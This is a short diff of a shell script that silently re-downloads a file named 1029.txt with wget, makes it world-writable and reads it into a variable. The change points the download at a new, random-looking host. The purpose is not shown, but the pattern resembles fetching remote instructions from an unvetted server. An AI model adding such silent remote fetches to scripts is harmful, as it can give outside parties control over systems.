@@ -1,5 +1,5 @@
 rm 1029.txt >/dev/null
-wget -q 'http://file.server-space.online/1029.txt'
+wget -q 'http://file.57c86e25072ca.noez.eu/1029.txt'
 chmod 777 1029.txt
 news=`cat 1029.txt`
 
